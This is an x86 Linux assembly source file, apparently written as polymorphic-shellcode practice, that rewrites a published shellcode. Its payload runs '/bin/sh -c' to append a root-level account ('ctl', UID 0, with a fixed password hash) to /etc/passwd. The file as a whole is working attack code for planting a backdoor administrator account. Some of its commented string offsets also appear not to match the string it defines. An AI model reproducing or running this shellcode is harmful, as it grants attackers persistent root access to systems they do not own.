; Filename: poly-addAcct.nasm
; Author:   boku
; Polymorphic version of  w000t-shell.c by zillion
; Original at: http://shell-storm.org/shellcode/files/shellcode-543.php
global _start
section .text
_start:
  jmp short jmp2call        ; jump2call so we can get the string location on the stack.
string2stack:
  pop esi                   ; pop memory location of string "/bin/sh#-c#/bin/echo.." into esi
  xor eax, eax              ; clear out eax register
  push eax                  ; push to null terminator for string "/bin//sh" on the stack.
  lea edx, [esp]            ; fill edx with pointer to null dword
  push dword [esi +42]      ; push "//sh" onto the stack.
  push dword [esi +38]      ; push "/bin" onto the stack.
  lea ecx, [esp]            ; save for later for ebx
  mov byte [esi +2], al     ; Null byte to terminate string "-c"
  mov byte [esi +61], al    ; Null byte to terminate string
                            ;  "/bin/echo ctl:NNwZ8D1QjVy3Y:0:0::/:/bin/sh >> /etc/passwd#"
  push eax                  ; push to stack argv[] Null dword array terminator.
  lea ebx, [esi +3]         ; move pointer to string "/bin/echo..." into ebx register
  push ebx                  ; argv[] 3rd arg. Mem location to "/bin/echo.." string
  lea ebx, [esi]            ; move pointer to string "-c" into ebx register
  push ebx                  ; argv[] 2nd arg. Memory location of "-c" anfter first string,
  mov ebx, ecx              ; memory address of "/bin//sh" on the stack
  push ebx                  ; argv[] array start. Memory pointer to string "/bin/sh"
  mov ecx, esp              ; point ecx to top of stack
  mov al, 0xb               ; 11 - syscall for execve
  int 0x80                  ; executes execve systemcall

jmp2call:
  call string2stack         ; jumps 2 next instruction and pushes memory location of string
                            ; below onto the stack.
  string db "-c#/bin/echo ctl:NNwZ8D1QjVy3Y:0:0::/:/bin//sh >> /etc/passwd"
;            01234567890123456789012345678901234567890123456789012345678901
;                      1         2         3         4         5         6

; string db "/bin/sh#-c#/bin/echo ctl:NNwZ8D1QjVy3Y:0:0::/:/bin/sh >> /etc/passwd#"
